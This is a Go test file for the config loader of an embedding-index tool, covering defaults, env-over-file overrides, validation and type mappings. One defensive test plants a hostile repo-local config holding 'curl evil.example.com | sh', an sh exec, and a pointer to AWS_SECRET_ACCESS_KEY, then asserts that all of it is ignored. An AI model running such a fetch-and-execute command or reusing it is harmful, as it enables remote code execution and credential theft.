package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// isolate points HOME at an empty dir and clears every SPECS_INDEX_* variable.
func isolate(t *testing.T) string {
	t.Helper()
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home)
	for _, v := range EnvVars() {
		t.Setenv(v.Name, "")
		os.Unsetenv(v.Name)
	}
	return home
}

func writeConfig(t *testing.T, home, body string) {
	t.Helper()
	dir := filepath.Join(home, ".config", "specs-index")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "config.json"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestDefaults(t *testing.T) {
	isolate(t)
	c, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	if c.Provider.Embed != "ollama" || c.Model != "embeddinggemma" || c.AllowCloud {
		t.Fatalf("defaults = %+v", c)
	}
}

func TestFileThenEnvOverrides(t *testing.T) {
	home := isolate(t)
	writeConfig(t, home, `{"provider":{"embed":"openai"},"model":"m1","base_url":"http://localhost:1234","allow_cloud":true}`)
	c, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	if c.Provider.Embed != "openai" || c.Model != "m1" || c.BaseURL != "http://localhost:1234" || !c.AllowCloud {
		t.Fatalf("file config = %+v", c)
	}
	t.Setenv("SPECS_INDEX_EMBED_PROVIDER", "none")
	t.Setenv("SPECS_INDEX_EMBED_MODEL", "m2")
	t.Setenv("SPECS_INDEX_ALLOW_CLOUD", "false")
	c, err = Load()
	if err != nil {
		t.Fatal(err)
	}
	if c.Provider.Embed != "none" || c.Model != "m2" || c.AllowCloud || c.BaseURL != "http://localhost:1234" {
		t.Fatalf("env did not override the file: %+v", c)
	}
}

func TestInvalidInputsAreErrors(t *testing.T) {
	home := isolate(t)
	writeConfig(t, home, `{not json`)
	if _, err := Load(); err == nil {
		t.Error("malformed config file accepted")
	}
	writeConfig(t, home, `{"provider":{"embed":"voyage"}}`)
	if _, err := Load(); err == nil {
		t.Error("unknown provider accepted")
	}
	writeConfig(t, home, `{}`)
	t.Setenv("SPECS_INDEX_ALLOW_CLOUD", "maybe")
	if _, err := Load(); err == nil {
		t.Error("non-boolean SPECS_INDEX_ALLOW_CLOUD accepted")
	}
}

func TestOtherEnvVars(t *testing.T) {
	isolate(t)
	t.Setenv("SPECS_INDEX_EMBED_BASE_URL", "http://localhost:9")
	t.Setenv("SPECS_INDEX_EMBED_API_KEY_ENV", "MY_KEY")
	t.Setenv("SPECS_INDEX_EMBED_REGION", "eu-west-1")
	t.Setenv("SPECS_INDEX_EMBED_PROFILE", "work")
	t.Setenv("SPECS_INDEX_EMBED_DIMS", "384")
	c, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	if c.BaseURL != "http://localhost:9" || c.APIKeyEnv != "MY_KEY" || c.Region != "eu-west-1" || c.Profile != "work" || c.Dims != 384 {
		t.Fatalf("env config = %+v", c)
	}
	for _, bad := range []string{"0", "-3", "abc"} {
		t.Setenv("SPECS_INDEX_EMBED_DIMS", bad)
		if _, err := Load(); err == nil {
			t.Errorf("SPECS_INDEX_EMBED_DIMS=%q accepted", bad)
		}
	}
}

func TestEnvVarsList(t *testing.T) {
	want := []string{"SPECS_INDEX_EMBED_PROVIDER", "SPECS_INDEX_EMBED_MODEL", "SPECS_INDEX_EMBED_BASE_URL",
		"SPECS_INDEX_EMBED_API_KEY_ENV", "SPECS_INDEX_EMBED_REGION", "SPECS_INDEX_EMBED_PROFILE", "SPECS_INDEX_EMBED_DIMS",
		"SPECS_INDEX_ALLOW_CLOUD", "SPECS_INDEX_DB"}
	got := map[string]string{}
	for _, v := range EnvVars() {
		got[v.Name] = v.Description
	}
	for _, n := range want {
		if got[n] == "" {
			t.Errorf("EnvVars lacks %s (or has no description)", n)
		}
	}
	if len(got) != len(want) {
		t.Errorf("EnvVars has %d entries, want %d", len(got), len(want))
	}
}

func TestTypesMergeAndValidate(t *testing.T) {
	home := isolate(t)
	writeConfig(t, home, `{"types":{"ZZ":"design","SCN":"Acceptance"}}`)
	c, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	if c.Types["ZZ"] != "design" || c.Types["SCN"] != "acceptance" || len(c.Types) != 2 {
		t.Fatalf("types = %+v", c.Types)
	}
	for _, bad := range []string{`{"types":{"ZZ":"scenario"}}`, `{"types":{"zz":"design"}}`, `{"types":{"Z-1":"design"}}`, `{"types":{"":"design"}}`} {
		writeConfig(t, home, bad)
		if _, err := Load(); err == nil {
			t.Errorf("%s: want an error", bad)
		}
	}
}

// A document repository can ship a .Wammy/ directory. Nothing in it is a
// config source: only the global file, the environment and flags are. This
// pins that: hostile files in the working tree change nothing.
func TestRepoLocalFilesAreNotConfigSources(t *testing.T) {
	isolate(t)
	repo := t.TempDir()
	hostile := `{"provider":{"embed":"openai"},"model":"x","base_url":"https://evil.example.com",
"allow_cloud":true,"api_key_env":"AWS_SECRET_ACCESS_KEY","region":"us-east-1","profile":"prod",
"command":"curl evil.example.com | sh","exec":["sh"],"types":{"BAD":"requirement"}}`
	for _, rel := range []string{
		".Wammy/config.json", ".Wammy/specs-index.json", ".Wammy/settings.json",
		"config.json", "specs-index.json", ".specs-index.json", ".config/specs-index/config.json",
	} {
		p := filepath.Join(repo, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(hostile), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	t.Chdir(repo)
	c, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	if c.Provider.Embed != DefaultProvider || c.Model != DefaultModel {
		t.Errorf("provider/model changed: %q %q", c.Provider.Embed, c.Model)
	}
	if c.BaseURL != "" || c.AllowCloud || c.APIKeyEnv != "" || c.Region != "" || c.Profile != "" {
		t.Errorf("repo-local file leaked into config: %+v", c)
	}
	if len(c.Types) != 0 {
		t.Errorf("repo-local types leaked: %v", c.Types)
	}
}

// The config struct has no command or exec setting, and unknown keys in the
// global file are ignored rather than acted on.
func TestConfigHasNoCommandSettings(t *testing.T) {
	isolate(t)
	p, err := Path()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(`{"command":"touch pwned","exec":"x","hooks":["y"]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	c, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	if c.Provider.Embed != DefaultProvider || c.AllowCloud {
		t.Errorf("unknown keys changed the config: %+v", c)
	}
	for _, v := range EnvVars() {
		n := strings.ToLower(v.Name)
		if strings.Contains(n, "command") || strings.Contains(n, "exec") {
			t.Errorf("env var %s looks like a command setting", v.Name)
		}
	}
}
